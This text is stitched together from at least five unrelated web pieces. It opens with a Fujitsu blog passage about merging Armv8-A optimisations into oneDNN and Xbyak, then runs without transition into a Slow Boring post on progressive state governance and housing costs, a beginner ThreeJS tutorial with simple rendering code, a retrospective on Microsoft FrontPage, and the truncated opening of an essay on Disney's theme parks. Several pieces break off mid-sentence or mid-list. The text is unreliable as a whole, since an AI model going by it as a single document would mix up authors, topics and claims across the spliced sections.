<figure title="Measurement speed up of reorder processing"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072157.png" alt="f:id:fltech:20201117072157p:plain" title="" itemprop="image"></span><figcaption>Measurement speed up of reorder processing</figcaption></figure>

<h2>Contribution of source code to the main branch of oneDNN</h2>

<p>I mentioned earlier that oneDNN source code has been released as OSS, but that is not all. It is being developed using an open development style that allows anyone to submit a pull request for source code they want to improve (request to incorporate improved source code into oneDNN). When a pull request has been submitted, the new source code is reviewed for bugs and tested to confirm that it improves the processing speed of oneDNN or helps to expand its functionality. If it passes both the review and test, it is incorporated into oneDNN. oneDNN is a software developed initially for CPUs with the x64 instruction set. The source code for our version of oneDNN, ported to and optimized for the Armv8-A instruction set, is available at <a href="https://github.com/fujitsu/oneDNN">https://github.com/fujitsu/oneDNN</a>. However, we thought that it would be beneficial for Fugaku users and many users in the world of CPUs that use the Armv8-A instruction set, if an implementation highly tuned for the main branch of oneDNN (the de facto DL process library) had been incorporated from the start. We therefore decided to work with Intel and actively submit a pull request to incorporate our changes into the main branch of oneDNN.</p>

<p>Incidentally, the improvements we made optimizing oneDNN for the Armv8-A instruction set were quite extensive, such as incorporating a required descriptor called Xbyak_aarch64 (explained later). For minor changes, all you need to do is modify the source code and submit a pull request. However, when submitting a pull request for large-scale changes to source code or for changes to APIs for parts related to the framework for oneDNN, you must first write a document called a Request For Comments (RFC) that describes what will be changed and summarizes the plan for doing so. Then, you must submit a pull request for the RFC itself for review and then merging. I put a lot of effort into writing the RFC knowing that this would benefit the many users of Fugaku and Armv8-A in the world. I treated this even more seriously than writing a research paper. It was a ton of work. But I finally did it. I submitted my RFC pull request. Before long, I received a question from an Intel developer on the RFC. I worked late into the night to make sure my answer was thorough. Then I went to sleep. And then I woke up. And then there was the next question. The Intel developer was located in the US, and because of the time difference the next question had been sent by the time I woke up. Not getting discouraged, I sent my response. Then I went to bed. And then I woke up. Next, the Intel developer had invited a developer from Arm to join in, since my RFP concerned an Arm product. It was now two-on-one battle. The Arm developer was located in the U.K. It was like we were playing volleyball and Arm and Intel had teamed for a spike fake-out. I could barely keep up. However, I were somehow able to answer all of their questions and they ultimately approved the RFC I had submitted. (Actually, they were really great people that treated me very kindly and asked purely technical questions. The fact that their questions came right after I responded due to the time difference actually meant that the process was going smoothly and shortened the time up to merging of the RFC.)</p>

<p>Once the RFC was merged, I next needed to submit a pull request for source code modified based on the RFC. I was able to keep up with the â€œspike fake-outsâ€� by Arm and Intel, and ultimately had the source code merged.
Having the source code (optimized for the Armv8-A instruction set) merged in an OSS project spearheaded by Intel caused quite a commotion in Fujitsu. It makes sense though. After all, from Intelâ€™s perspective this would help collaborating companies. Of course, the primary reason for this was that Intel opened the door on pull requests for other CPUs. So first of all, I would like to express my gratitude here for Intel. The secondary reason for this is that our source code was technically solid and that Intel recognized that it would help in developing DL process libraries. I do have to admit that I am a bit proud of this.</p>

<h2>Development of Xbyak_aarch64</h2>

<p>It is now time to discuss at some depth the technical aspects of porting and optimizing oneDNN for the Armv8-A instruction set. One of the key technologies in Intel's oneDNN is that it incorporates a JIT assembler called Xbyak (see the figure below).</p>

<figure title="Source code structure of oneDNN"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072153.png" alt="f:id:fltech:20201117072153p:plain" title="" itemprop="image"></span><figcaption>Source code structure of oneDNN</figcaption></figure>

<p>Xbyak is a software developed by Shigeo Mitsunari of Cybozu Labs and released as <a href="https://github.com/herumi/xbyak">OSS (https://github.com/herumi/xbyak)</a>. Xbyak offers the following features.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Happy Monday! </p><p>I’m very excited to get my first real week here at <code>Slow Boring</code> off the ground. But first I wanted to thank everyone who subscribed on Friday or over the weekend. The show of support is incredibly gratifying, and with your help I think we can make this thing work. We’re going to do four weeks of free content, after which most of the content will be for paying members only, so sign up now while introductory rates apply. </p><p>I’d also like to encourage members to participate in the comments sections and open threads. I’ve traditionally been very comments-averse myself, even while thinking that comments seem like a good idea in theory. But I realized that paid membership programs are the right way to make this work. Since the only people in the comments are the people who are sufficiently bought-in to pay money, you’re not going to have drive-by trolling. I’ve been delving in and engaging, and I hope you will, too. </p><p>Now, on to the main event: I want to talk about the important question of what progressives do in politics in the places we govern.</p><h4>An upside to NIMBYism?</h4><p>Since people know I’m interested in the geographic bias of the political system and also in the consequences of housing scarcity in coastal cities, one question people sometimes ask me is whether NIMBYism is politically beneficial. The idea here is that housing scarcity in California drives people out of the state and into more conservative areas, which helps Democrats fight Senate skew.</p><p>I think this is probably wrong, factually speaking. California has what’s basically a state-level version of the Congressional Budget Office called the Legislative Analyst’s Office, and when they looked at <a href="https://lao.ca.gov/LAOEconTax/Article/Detail/265">net migration to and from California</a>, they found that “families with kids and those with only a high school education predominate among those moving from California to its top destination states,” while “college-educated 18 to 35 year olds led the way among those moving to California.” That makes sense as it’s working class families with kids who suffer most from housing scarcity. But that means it’s probably disproportionately Republicans leaving, which is also what <a href="https://www.sacbee.com/news/local/sacramento-tipping-point/article246370775.html">most of the anecdotal reporting says</a>. By the same token, exit polls say <a href="https://www.dallasnews.com/news/politics/2018/11/09/native-texans-voted-for-native-texan-beto-o-rourke-transplants-went-for-ted-cruz-exit-poll-shows/">Beto O’Rourke won native-born Texans in 2018</a> while losing transplants. </p><p>But more fundamentally, I don’t think finding ways to look on the bright side of bad policy choices is a good idea. </p><p>Friday’s post was mostly on the bummer theme of how, if progressives want to get anything done in federal politics, <a href="https://www.slowboring.com/p/welcome-to-slow-boring">we need to reconcile ourselves to trimming our sails quite a bit</a>. But the other side of the coin is that you need to reach for the impossible to some extent or you’ll never achieve anything. Creating an actual statewide high-quality universal preschool program that delivered great results and made everyone happy, for example, would be a great way to build momentum nationally for such a program. </p><p>It’s in the blue states like California where the stuff progressives want to be doing with their energy — dreaming big, organizing, demanding stuff — could actually accomplish something. But it’s going to take hard work and also, yes, some technocratic fussing. </p><h4>Social democracy in one Bay State</h4><p>My go-to example for this is Massachusetts, the state that pioneered both marriage equality and the Affordable Care Act, which became progressives’ two big national successes. </p><ul><li><p>At 6.9 million people, Massachusetts has a larger population than Finland or Denmark. </p></li><li><p>While some people say you can’t create a state-level social democracy in the United States because of the lack of monetary sovereignty, Finland is part of the Eurozone and needs to follow EU fiscal rules, and Denmark has its currency pegged to the Euro. </p></li><li><p>Massachusetts has open borders with the rest of the United States, but Finland and Denmark have open borders with the EU. </p></li><li><p>In PPP-adjusted terms, Massachusetts’ GDP per capita is a bit higher than oil-rich Norway and decidedly higher than Finland or Denmark.</p></li></ul><p>Long story short, Massachusetts has the material resources to make social democrats’ dreams come true. And even though Elizabeth Warren’s election results there indicate pretty clearly that she pays an electoral penalty for being seen as an unusually left-wing Democrat, she still easily wins statewide elections — “hey, those ideas are unusually left-wing!” is not an obvious loser there. </p><p>If the way forward for <em>Democrats</em> is to reconcile themselves to the realities of the political map, the way forward for <em>progressives</em> is to try to put forward a vision that’s actually exciting and appealing to the unusually progressive electorate of places like Massachusetts, then implement it in those places in a way that makes progressive politics look successful and appealing to voters everywhere. </p><ul><li><p>You probably can’t do “Medicare for All” in one state because of interactions with the federal Medicare program, but you could definitely do an ambitious public option with auto-enrollment that’s designed to gain market share over time.</p></li><li><p>You could definitely do free public college, or if that’s too expensive, you could do free community college. </p></li><li><p>All kinds of Green New Deal stuff about energy and transportation infrastructure is doable on the state level. </p></li><li><p>Child allowance and other strategies to reduce poverty are very doable on the state level, as are preschool and child care plans. </p></li><li><p>As David Madland points out, <a href="https://www.americanprogress.org/issues/economy/reports/2019/12/11/478539/guide-state-local-workers-boards/">state governments can even create wage boards</a> and move to a system of sectoral collective bargaining. </p></li></ul><p>State government is not a panacea or a long-term alternative to building national political power. But it is potentially a very effective way to make people’s lives better. And more to the point, it is potentially a very effective way to build national political power by <em>showing people you have good ideas that work</em> and that you know what you’re doing. </p><p>But a more ambitious version of state-level progressive governance would also have to confront the question of whether or not Blue America’s political leaders <em>do</em>, in fact, know what they’re doing. </p><h4>Who is Blue America for?</h4><p>I grew up in Manhattan, went to Harvard, then moved to DC, so I am personally a pretty out-of-touch person. </p><p>But my broad sense is that most middle class Americans think of the big blue states, especially New York and California, as nice places to live for rich snobs, not as places that have really high quality public services. People who wouldn’t want to live in Finland (it’s too cold, too dark, bad food) could still concede that it would be nice to have all these free social benefits. But while taxes really are higher in blue America, it’s not like San Francisco has the country’s best public schools or SUNY is the most impressive public university system. </p><p>That’s not to say these are horrible places to live! But what you get in New York is access to a unique set of cultural amenities. California has cultural amenities, great weather, and access to the natural beauty that lurks right outside the major cities. To gain access to those amenities you need to deal with  high housing costs. So if you’re rich and enjoy that stuff, you can have a nice house in Brooklyn. Alternatively, if you’re rich and live someplace cheaper, you can have a giant mansion, a couple of fancy cars, and a boat. If you’re <em>young,</em> you can have dismal accommodations in a big liberal city but have fun going out and meeting people. But a middle class couple with a generic job and a couple of kids isn’t setting out to blue America for the higher material living standards.  </p><p>That’s because there are huge regional differences in the cost of living in the United States, they disfavor the blue coastal areas, and they’re driven by housing costs.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png&quot;,&quot;height&quot;:525,&quot;width&quot;:602,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:223939,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If you’ve read anything that I’ve written ever, you know <a href="https://www.amazon.com/Rent-Too-Damn-High-Matters-ebook/dp/B0078XGJXO">the reason is land use regulations</a>. Reforming those policies is critical to making blue states great places to live, places that people associate with prosperity and policy success rather than eccentric lifestyle preferences. </p><p>And while public housing, affordable housing set-asides, and other forms of non-market or “social” housing can be a piece of the puzzle, market-rate housing is essential. </p><p>One reason it’s essential is that a well-governed, great place to live should be accessible to middle class people, not an upstairs/downstairs economy of rich people and the subsidy-dependent. But another reason is that robust market-rate housebuilding grows the economy and the tax base and at least makes it conceivable that you’re going to provide first-rate public services instead of just paying off old pension debt. And growing the tax base matters. It’s not true that you can’t build a robust welfare state in a governance unit that needs to balance its budget. But it <em>is</em> true that in state and local politics you are playing with real money. Cash spent on the library can’t go to the parks. Cash spent on the bus means higher taxes. To be popular and effective you need to deliver value, especially if you’re not sitting on a geyser of tech IPOs throwing off tax revenue.</p><h4>Subway socialism </h4><p>Over the past few years I’ve gotten really interested in the so-called <a href="https://www.thenation.com/article/archive/last-sewer-socialists/">“sewer socialists” of Milwaukee</a>.</p><p>In the early 20th century there was a big base of German immigrants in the Milwaukee area to whom socialism was not a scary foreign concept, so socialists were able to win elections and control municipal government. In office, they built one of the first municipal public works departments, and they were proud of the DPW’s accomplishments. Other socialists from elsewhere around the country were, as socialists in America typically are, left-wing intellectuals detached from practical governance. And they made fun of these Milwaukee guys for constantly talking about their public works rather than overthrowing capitalism. </p><p>But what the Milwaukee guys got was that if you want non-market provision of stuff, there comes a time when <em>you actually need to go do the stuff</em>.

<!-- Horizontal Top Article -->
<p>With a little knowledge in Javascript, you can do incredible things in 3D with ThreeJS. It’s much simpler than it looks and it’s so much fun. The only problem is the first learning barrier. Today, I’m taking that barrier down for you in 5 minutes. After that, all you’ll have to do is have fun.</p>



<h3>What is ThreeJS?</h3>



<p>ThreeJS is a library in Javascript, created by <a href="https://twitter.com/mrdoob" target="_blank" rel="noreferrer noopener">Mr.doob</a>, that allows you to manipulate 3D objects directly in the browser. What you have to understand is that ThreeJS, <strong>via Javascript</strong>, allows you to use <a href="https://en.wikipedia.org/wiki/WebGL" target="_blank" rel="noreferrer noopener">WebGL</a> in an <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" target="_blank" rel="noreferrer noopener">HTML5 canvas</a>.</p>



<p><strong>WebGL</strong> is a <strong>Javascript API</strong> that allows you to create 2D and 3D graphic rendering.<br>A <strong>canvas </strong>is an <strong>HTML component</strong> that is part of the HTML5 specification and allows to display graphic rendering.</p>



<p>ThreeJS, via Javascript, allows you to drive WebGL, and thus 3D. <strong>And the crazy part is that there is no additional installation and/or plugin needed !</strong> Import the the library and voila, the 3D world is opening.</p>



<figure><img src="https://i.imgur.com/voS76PB.jpg" data-src="https://i.imgur.com/voS76PB.jpg" alt=""></figure>



<p>So in summary, we have a <strong>Javascript library<strong>(ThreeJS)</strong></strong> that manipulates a <strong>Javascript API to do graphical rendering</strong> (WebGL) in an <strong>HTML5 component</strong>. Easy!</p>



<p>Now you’re going to tell me, why are we using ThreeJS? If it’s actually WebGL, why not write WebGL directly ?  The answer is pretty simple. </p>



<p>ThreeJS simplifies and shortens to the extreme the code needed to do whatever you want. <strong>ThreeJS does all the complex part for you.</strong> You just have to do simple Javascript on your side.</p>



<p>So if you have simple Javascript knowledge, ThreeJS gives you the power to do incredible things in 3D.</p>



<p>But concretely, how does it work?</p>



<h3>How does it work?</h3>



<p>To understand how ThreeJS works at a high level you need to put yourself in the shoes of a film director. Yes, poof, I’ve just decided, <strong>you’re a movie director now</strong>.</p>



<p>And to shoot your movie in Javascript, you’re going to need to create and manipulate several key elements.</p>



<ul><li><strong>The scene</strong></li></ul>



<p><strong>You can see the scene like the 3D world you’re going to work in.</strong> You’re going to arrange objects in this scene. You’re going to create as many objects as you want in your scene via the meshes.</p>



<hr>



<ul><li><strong>The meshes</strong></li></ul>



<p>Meshes are simply the objects that will be present in your scene. You will need to put light on these objects to see them. To see them, you will have to film them. To film them, you need a camera.</p>



<hr>



<ul><li><strong>The camera</strong></li></ul>



<p>As in real life, the camera will show a point of view of your scene. <strong>We’re going to talk about field of view (fov), to be precise.</strong> By moving the camera, you’re going to move objects in or out of this field of view. It’s what you see in this field of view of this camera that will be sent to the rendering engine.</p>



<hr>



<ul><li><strong>Rendering engine</strong></li></ul>



<p>The rendering engine takes the scene and the camera as parameters. <strong>With that, it displays everything in the HTML5 canvas I was telling you about at the beginning.</strong> The rendering engine will produce an image each time your screen is refreshed. In general, 60 frames per second. That’s what gives life to your animation!</p>



<p>I guess it can still be pretty abstract at the moment. I have to draw you a picture to make it more concrete. Ok, I’ll use my drawing skills then.</p>



<div><figure><img src="https://i.imgur.com/f7FVxpB.jpg" data-src="https://i.imgur.com/f7FVxpB.jpg" alt=""></figure></div>



<p>Can you tell i’m backend developer ?</p>



<p>Anyway, it should be much clearer now between the explanations and the drawing. But we’re getting to know each other, I know you want to see code now.</p>



<h3>Show the code</h3>



<p>As the Hello World app we’ll make it as simple as possible. We’re going to code the schema I made for you just before.</p>



<p>A basic scene with a cube in the middle. Except that instead of the cube, we’re going to put a cylinder, just because I feel like it. <strong>We’re going to make it spin on itself and we’re going to put it in the camera’s field of view.</strong></p>



<p>I’m going to comment strongly on each line so that you understand everything that’s going on. I will also frequently talk about <a href="https://threejs.org/docs/index.html#manual/en/introduction/Creating-a-scene" target="_blank" rel="noreferrer noopener">the official documentation</a>, so don’t hesitate to read it as you go along.</p>



<figure><img src="https://i.redd.it/57vwxbnx22w01.jpg" data-src="https://i.redd.it/57vwxbnx22w01.jpg" alt=""></figure>



<p>We start by <strong>declaring our scene</strong>, without that, nothing is visible! Then <strong>the rendering engine</strong> for our scene. Without this, no image will be created and displayed to the user. Then we want <strong>a camera</strong> to film the scene. Here we will use a perspective camera. The options allow us to configure the field of view.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const scene = new THREE.Scene()
const renderer = new THREE.WebGLRenderer()
const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000)</pre>



<p>We already have everything we need to show things now. Let’s create the cylinder via a <a href="https://threejs.org/docs/#api/en/objects/Mesh" target="_blank" rel="noreferrer noopener">mesh</a>! To create a mesh we need two things.</p>



<p><strong>The geometric shape that the object will have</strong>. Here we want a cylinder so <strong><a href="https://threejs.org/docs/#api/en/geometries/CylinderGeometry" target="_blank" rel="noreferrer noopener">CylinderGeometry</a></strong> is perfect for our needs.</p>



<p><strong>The material of this object.</strong> The material is the digital version of real world materials. The materials control the color of the object and the degree of reflection of the surface. <strong>Here we put a basic material of red color.</strong></p>



<p>With these two parts we can create our object, add it to the scene and place the camera over it.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const geometry = new THREE.CylinderGeometry(5, 5, 20, 32)
const material = new THREE.MeshBasicMaterial({ color: 0xff0000, wireframe: true })
const cylinder = new THREE.Mesh(geometry, material)

scene.add(cylinder)
camera.position.z = 20</pre>



<p>Then, we’re going to put the rendering engine in full screen and add it in the HTML page via the HTML5 canvas!</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">renderer.setSize(window.innerWidth, window.innerHeight)
document.body.appendChild(renderer.domElement)</pre>



<p>Finally, we’re going to animate things up. <strong>We are going to create an animation function that will be called in an infinite loop.</strong> Each time we go through this function we’re going to:</p>



<ul><li>make the cylinder rotate on itself</li><li>ask the rendering engine to create and display an image</li><li>recall this same animation function</li></ul>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function animate() {
    cylinder.rotation.x += 0.01
    cylinder.rotation.y += 0.01

    renderer.render(scene, camera)

    requestAnimationFrame(animate)
}

animate()</pre>



<p>And that’s it ! Done ! I put everything in a codepen and let you play with it now.</p>







<p>I tried to make this article a highway for understanding Javascript 3D. I sincerely think that after this first barrier of understanding, you can quickly do incredible things! Go use you new power now.</p>



<figure><img src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" data-src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" alt=""></figure>



<p>A few weeks ago, I hadn’t touched 3D in any way, shape or form. Starting from the basic example I just presented to you, in a few days,<strong> I created a 3D web experience that takes you through the universe in your browser</strong>.</p>







<p>I’m really super proud of it and I invite you to <a href="https://www.jesuisundev.com/en/across-the-universe/" target="_blank" rel="noreferrer noopener">take a look at it</a>. There’s a story, music and it’s amazing. <strong><a href="https://across-universe.com/" target="_blank" rel="noreferrer noopener">A real show!</a></strong> If you’re even more curious, you have all <strong><a href="https://github.com/jesuisundev/acrosstheuniverse" target="_blank" rel="noreferrer noopener">the source code on my GitHub</a></strong>.</p>



<h3>Epilogue</h3>



<p>If I can do this kind of thing in a week, that’s proof that anyone can do it. Anything you can imagine as animation is within your reach with your knowledge of Javascript. And now that you have the ThreeJS base, it’s up to you to see if the adventure tempts you.</p>

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

</div></div><div data-block-type="2" id="block-83d26a75802dd2ca90d0"><div><p><span><strong><em>Chapter One: The Past </em></strong></span></p><p>Disney is the envy of every media company, regardless of whether it focuses on film, TV, gaming, music or publishing. In plain terms, there has never been a more dominant entertainment company, globally or in the US. It has a brand that actually matters to consumers, owns franchises that consumers essentially treat like subscription content services, and operates the biggest star-making platforms in the world. And as strong as this platform was at the start of 2019, it exited the year even stronger. In a matter of weeks, Disney’s brand new direct-to-consumer platform acquired 30MM subscribers.</p><p>The deeper we get into the digital era, the more dominant Disney seems to become. After all, it was long expected that the Internet would disrupt dominant media companies and IP via rights infringement and the emergence of myriad user-generated “franchises”. However, one of the biggest storytelling “lessons” in the 20th and early 21th century was that audiences have an unending desire for “more” of the stories they <em>already </em>love. And the Internet has enabled this to an unprecedented degree. You can constantly track production (cast Instagrams, behind-the-scenes featurettes, and leaks on social media), engage in fan communities (message boards and YouTube theory/Easter egg videos), consume endless amounts of fan content (e.g. fanfic and watch-along podcasts), play this content back on demand (e.g. Netflix), and engage in never-ending and constantly updated online multiplayer games (e.g. Star Wars: Battlefront 2). This is a powerful, self-sustaining financial and cultural flywheel. And Disney has many of the franchises that best lend themselves to this model. Many of those they don’t own, such as <em>Harry Potter</em>, have their rights fragmented.</p><p>But what is the strongest, most profitable, most defensible part of Disney’s business in the digital era? Its capex-heavy, physical theme parks.</p><p>There is no simple way to quantify how important this business unit is to Disney. The financial role is obvious. Disney’s Parks &amp; Attractions segment generates nearly 100% more revenue and 60% more profit than Disney’s studio division (which 